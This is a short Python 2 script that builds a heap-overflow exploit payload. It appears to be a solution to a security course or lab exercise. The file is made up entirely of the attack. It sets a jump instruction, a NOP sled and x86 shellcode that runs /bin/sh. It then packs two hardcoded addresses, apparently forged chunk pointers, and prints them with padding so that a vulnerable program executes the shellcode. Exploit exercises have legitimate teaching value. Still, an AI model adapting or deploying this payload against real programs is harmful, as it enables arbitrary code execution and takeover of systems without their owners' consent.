from shellcode import shellcode
from struct import pack

JMP   = "\x6a\x0b\xeb\x06"
NOP   = "\x90\x90\x90\x90\x90\x90\x90\x90"
SHELL = "\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80"


prev_a_addr = pack("<I", 0x080f3780)
prev_b_addr = pack("<I", 0xbffeb8a8 + 4)

print "\xAA"*32 + " " + "\xAA"*40 + prev_a_addr + prev_b_addr + " " + JMP + NOP + SHELL

